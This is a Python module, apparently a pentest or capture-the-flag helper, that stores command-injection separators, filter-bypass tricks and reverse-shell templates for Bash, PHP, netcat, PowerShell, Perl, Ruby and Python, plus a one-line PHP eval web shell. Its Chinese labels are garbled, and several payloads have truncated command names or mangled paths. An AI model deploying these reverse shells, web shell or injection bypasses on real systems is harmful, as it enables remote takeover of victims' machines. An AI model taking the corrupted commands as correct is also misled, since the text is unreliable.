# -*- coding: utf-8 -*-
"""鍛戒护娉ㄥ叆 / 鍙嶅脊 Shell Payload 妯″潡."""

from typing import List, Dict



RCE_CMD: Dict[str, List[str]] = {

    "鍛戒护娉ㄥ叆閾炬帴绗?: [";", "|", "||", "&&", "&", "\\n", "%0a"],

    "绌烘牸缁曡繃": [

        "{IFS} 鍙橀噺", "<> 閲嶅畾鍚?, "{,} 澶ф嫭鍙峰睍寮€",

        "%09 姘村钩鍒惰〃", "%0a 鎹㈣", "%0b 鍨傜洿鍒惰〃",

    ],

    "鍏抽敭瀛楃粫杩?: [

        "鍗曞紩鍙锋媶鍒? c'a't", "鍙嶆枩鏉? c\\at",

        "閫氶厤绗? /???/c?t", "鍙橀噺鎷兼帴: ca$*t",

    ],

}



_REV_SHELL_TMPL = {

    "Bash": [

        ("bash 鍙嶅脊", "h -i > /d/tcp/IP/PORT 0 1"),

        ("bash 2>&1", "h -i > /d/tcp/IP/PORT 0>&1"),

        ("bash 5>", "h -i 5<> /d/tcp/IP/PORT 0> 5 1> 5 2> 5"),

    ],

    "Python": [

        ("python 鍙嶅脊",

         "y -c \"_import_('s').popen(_import_('b').b64decode('...').decode()).read()\""),

    ],

    "PHP": [

        ("php 鍙嶅脊",

         "p -r '$s=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),

        ("php 涓€鍙ヨ瘽",

         "p -r '\"<?php eval(_POST[1]);?>\" > shell.php'"),

    ],

    "NC": [

        ("nc 鍙嶅脊 (浼犵粺)", "c IP PORT -e /bin/sh"),

        ("nc 鍙嶅脊 (绠￠亾)", "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f"),

    ],

    "PowerShell": [

        ("ps 鍙嶅脊",

         "owers -c \"$c=New-Object Net.Sockets.TCPClient('IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.UTF8Encoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::UTF8).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\""),

    ],

    "Perl": [

        ("perl 鍙嶅脊",

         "erl -e 'use Socket;$i=\"IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(\"STDOUT\",\">&S\");open(\"STDERR\",\">&S\");exec(\"/bin/sh -i\");'"),

    ],

    "Ruby": [

        ("ruby 鍙嶅脊",

         "uby -rsocket -e 'f=TCPSocket.open(\"IP\",PORT);exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f.fileno,f.fileno,f.fileno)'"),

    ],

}



RCE_BYPASS: Dict[str, List[str]] = {

    "甯哥敤閾炬帴绗?: [";", "|", "||", "&&", "&", "%0a", "\\n"],

    "绌烘牸缁曡繃": ["${IFS}", "$IFS$9", "<>", "{cmd,arg}", "%09", "%0a"],

    "鏂滄潬缁曡繃": [

        "$(echo L2ZsYWc=|base64 -d)",

        "${PATH:0:1}bin${PATH:0:1}sh",

    ],

    "鍏抽敭瀛楃粫杩?: [

        "c'a't /fl'a'g", "c\\at /fl\\ag",

        "ca$*t", "/???/c?t /???/f??g",

        '"c"a"t" /f*',

    ],

}





def get_shell_types() -> list:

    return list(_REV_SHELL_TMPL.keys())





def get_shell(name: str) -> list:

    return _REV_SHELL_TMPL.get(name, [])





def get_rce_cmd() -> dict:

    return RCE_CMD





def get_rce_bypass() -> dict:

    return RCE_BYPASS

